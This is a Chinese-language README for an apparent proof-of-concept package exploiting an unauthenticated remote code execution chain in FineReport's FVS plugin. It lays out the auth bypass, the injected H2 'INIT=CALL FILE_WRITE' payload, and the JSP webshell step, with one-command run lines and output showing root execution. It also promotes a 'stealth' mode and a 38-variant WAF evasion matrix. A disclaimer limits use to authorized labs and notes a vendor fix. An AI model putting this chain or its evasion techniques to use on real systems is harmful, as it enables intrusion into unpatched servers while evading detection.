# 帆软 FineReport FVS 插件未授权 RCE —— PoC 包（fr-fvs-unauth-rce）

- **影响**：FineReport < 11.5.16（FVS/Duchamp 复用资源链路；实验基线 11.5.15 + wysiwyg 插件 4.13.0）
- **修复**：升级 FineReport 至 11.5.16（插件 4.15.0 加鉴权卫兵，同载荷对照已证失效）
- **定性**：未授权（预认证）远程代码执行；命令以应用进程权限运行（实验容器内 uid=0）
- **情报**：某厂商安全团队 2026-11 公开通告"三重缺陷叠加"；无公开 PoC，本包为独立复现

## 链路一图

```
?tplPath=reportlets 鉴权绕过
  → 未授权上传复用包（props.name 注入 ";INIT=CALL FILE_WRITE(X'JSP的hex','ROOT路径')--"）
  → apply 导入 → DBFileImporter.testConnection 打开注入的 jdbc:h2 URL
  → INIT 执行 FILE_WRITE（任意路径任意后缀写，穿过定制 H2 补丁三处拦截）
  → 写 JSP 到 /webapps/ROOT/（绕过只监控 webroot 的 JSP-Monitor）
  → GET /<jsp>?c=<cmd> 命令执行 → 输出写回 webroot → GET 回读
```

## 目录

| 路径 | 内容 |
|---|---|
| `poc.py` | 一键 PoC（纯 Python3 标准库，零依赖）：上传→apply→触发→回读，内置 5 种实测可用形态（含 `stealth` 全隐身形态） |
| `vulnerability-analysis.md` | 原理分析：三缺陷链 + 反编译代码摘录 + 执行原语判决实验 + sink 唯一性排除法 |
| `waf-bypass-matrix.md` | 规避形态实测矩阵：**38 变体两层（L1 字符级 / L2 结构级）**，X12 终极叠加实测全通 + 检测建议 |

## 快速开始（仅限授权靶场）

```bash
# 基线形态
python3 poc.py -t http://<靶场>:18081

# 自定义命令
python3 poc.py -t http://<靶场>:18081 -c "id"

# stealth 全隐身形态（实测端到端 uid=0）：
#   JSON \uXXXX 全转义（HTTP 层零 SQL/hex/路径/后缀特征）
#   + CONCAT/CHAR 在 H2 内拼出 .jsp 后缀（请求中无明文后缀）
#   + 路由段百分号编码 + apply 参数入 POST body + 绝对 URI 请求行
python3 poc.py -t http://<靶场>:18081 --shape stealth
```

实测输出（2026-11-22，自建靶场）：

```
[1] upload  -> 200  id=bc401fbc-...
[2] apply   -> 200  {"applySuccess":true,...}
[3] trigger -> 200  waitFor=0
[4] readback-> 200
PWN-FVS-UNAUTH-RCE
uid=0(root) gid=0(root) groups=0(root)
<容器hostname>
2026年 11月 22 日 20:18:27 CST
```

## 规避能力一览（详见 `waf-bypass-matrix.md`）

- **L2 结构级**（对"规则防死简单混淆"的场景）：JSON `\u` 全转义（解码深度错位，WAF
  不做 JSON 反转义即全盲）、CHAR/CONCAT 运行期拼 `.jsp` 后缀、apply 参数入 body、
  absolute-form 请求行、路由段百分号编码——**X12 全叠加实测仍通**
- **L1 字符级**：大小写/注释/hex 切块/路径噪声/参数污染等 16 类命中形态

## 证据指纹（sha256，本地留存未随仓发布）

```
08eea996f2c52cb7e0e895ebe5cbd0a5c2c41c76b5f2941b10f3ff31d2df604e  rce_readback.txt
06fb2738ae89c6d81261577b1726470601350c9f96df411f49b4e01ed58589cd  pwn114516.jsp
79ec1708dd56a3193c6b35d34819668311b899bdfe1ed65538593f7fbe513df7  engine_log.txt
```

## 环境说明

实验靶场：FR 11.5.15 引擎容器（宿主 18081→8080），11.5.16 修复对照镜像已归档。
PoC 零依赖（复用包内存构造，`appdata.mv.db` 内容任意）。

## 免责

仅用于授权安全测试、自有靶场复现与防御研究，禁止对生产环境或他人资产使用。
本仓库对应漏洞已由厂商修复（11.5.16）并公开通告；全部实验在自建靶场完成，不含任何真实目标信息或凭据。
